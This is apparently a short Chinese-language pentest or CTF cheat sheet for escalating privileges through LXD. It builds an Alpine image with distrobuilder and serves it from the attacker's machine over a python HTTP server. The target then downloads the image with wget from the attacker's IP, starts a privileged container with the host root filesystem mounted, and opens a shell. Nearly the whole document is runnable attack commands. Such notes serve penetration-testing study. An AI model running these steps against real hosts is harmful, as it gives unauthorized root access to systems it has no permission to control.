知识点： 本地文件读取上传shell   lxd提权 制作镜像 上传服务器 开启特权容器
shell:
https://images.lxd.canonical.com/ #下载相关镜像
#本地或者制作镜像
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18

python3 -m http.server 8000 #本地

#目标机
wget http://{local_IP}:8000/lxd.tar.xz
wget http://{local_IP}:8000/rootfs.squashfs

lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

lxc image list

lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
